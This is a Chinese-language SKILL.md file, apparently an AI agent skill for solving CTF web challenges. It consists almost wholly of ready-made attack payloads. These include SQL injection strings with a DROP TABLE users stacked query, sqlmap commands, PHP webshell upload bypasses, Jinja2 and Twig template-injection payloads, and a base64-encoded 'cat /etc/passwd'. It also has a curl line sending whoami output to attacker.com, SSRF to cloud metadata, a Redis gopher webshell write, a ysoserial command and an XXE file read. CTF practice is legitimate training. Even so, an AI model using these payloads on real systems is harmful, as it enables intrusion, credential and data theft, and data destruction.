# ctf-web — CTF Web方向解题

**路径**: `skills 目录/ctf-web/SKILL.md`

## SQL 注入

### 特性
多为**盲注 / 布尔注入 / 时间注入**，极少有回显。

```sql
-- 判断注入
' OR IF(1=1,SLEEP(3),0)#
' AND ASCII(SUBSTRING((SELECT database()),1,1))>100#

-- 报错注入
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))#
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),0)#

-- 堆叠注入
';DROP TABLE users;--

-- 二次注入（注册点写入，查询点触发）
username: admin'#
```

```bash
sqlmap -u "http://target/?id=1" --batch --technique=B --level=3
sqlmap -u "http://target/?id=1" --batch --technique=T --level=3
```

## PHP 反序列化

### Magic Methods
```
__construct()   // 对象创建
__destruct()    // 对象销毁
__wakeup()     // 反序列化
__toString()   // 字符串拼接
__invoke()     // 当对象作为函数调用
__call()       // 调用不存在的方法
```

### 绕过 __wakeup()
```
O:4:"name":2:{...} → O:4:"name":1:{...}  (对象数改小)
```

### POP 链
- 找 `__destruct()` → 可利用方法 → `system()`/`exec()`/`eval()`
- gadget：`__destruct()` → `__toString()` → 利用点

## 文件上传

```
1. .phtml / .phar / .phpt / .php3 / .php5
2. 大小写：.PhP
3. 空字节：shell.php%00.jpg
4. 文件头伪装：GIF89a + <?php system($_GET['x']);?>
5. .htaccess：AddType application/x-httpd-php .jpg
6. .user.ini：auto_prepend_file=shell.png
7. 竞争上传：同时发多个请求
```

## SSTI

### Jinja2 (Python)
```
{{7*7}}  → 49（确认注入）
{{config}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{lipsum.__globals__.__builtins__}}
```

### Twig (PHP)
```
{{7*7}}
{{["id"]|map("system")}}
```

## 命令注入

```bash
# 空格绕过
${IFS} / $IFS$9 / < / {cat,}

# Base64
`echo Y2F0IC9ldGMvcGFzc3dk | base64 -d`

# 无回显：DNS外带
curl http://attacker.com/?a=$(whoami)
```

## SSRF

```
file:///etc/passwd
dict://127.0.0.1:6379/info
gopher://127.0.0.1:6379/_...
http://169.254.169.254/（AWS元数据）
```

### Redis 写 WebShell（Gopher）
```
gopher://127.0.0.1:6379/_
SET shell "<?php eval($_POST[1]);?>"
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
```

## Java 反序列化

- 识别：`rO0AB`（Base64）或 `aced 0005`（Hex）
```bash
java -jar ysoserial.jar CommonsCollections6 "whoami" > payload.ser
```

## XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

## 触发词
CTF Web、SQL注入、XSS、SSRF、文件上传、反序列化、SSTI、命令注入、XXE、绕过技巧
